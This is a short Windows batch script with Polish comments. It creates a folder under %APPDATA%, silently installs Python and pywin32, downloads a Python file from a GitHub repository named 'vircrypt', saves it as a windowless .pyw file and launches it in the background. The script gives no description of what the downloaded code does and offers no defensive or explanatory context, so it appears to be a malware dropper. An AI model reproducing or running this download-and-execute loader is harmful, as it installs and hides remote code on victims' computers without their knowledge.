@echo off
set folder=%APPDATA%\Xdev_csp

REM Tworzymy folder jeśli nie istnieje
if not exist "%folder%" (
    mkdir "%folder%"
)

REM Sprawdzamy, czy Python jest zainstalowany
where python >nul 2>nul
if %errorlevel% neq 0 (
    echo Python nie jest zainstalowany. Instaluję...
    REM Pobieramy instalator Pythona (najpierw sprawdzamy architekturę)
    set "python_installer=https://www.python.org/ftp/python/3.10.6/python-3.10.6-amd64.exe"
    echo Pobieranie Pythona...
    powershell -Command "Invoke-WebRequest -Uri '%python_installer%' -OutFile '%TEMP%\python-installer.exe'"

    REM Instalacja Pythona
    echo Instalowanie Pythona...
    start /wait %TEMP%\python-installer.exe /quiet InstallAllUsers=1 PrependPath=1

    REM Usuwamy instalator
    del %TEMP%\python-installer.exe
)

REM Sprawdzamy, czy pip jest zainstalowany
where pip >nul 2>nul
if %errorlevel% neq 0 (
    echo pip nie jest zainstalowany, instaluję...
    python -m ensurepip --upgrade
)

REM Instalowanie wymaganych bibliotek
echo Instalowanie wymaganych bibliotek...
pip install pywin32

REM Pobieramy skrypt do folderu
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ex0my/vircrypt/refs/heads/main/TSTSTS.py' -OutFile '%folder%\TSTSTS.pyw'"

REM Uruchamiamy skrypt Pythona w tle
start /B python "%folder%\TSTSTS.pyw"
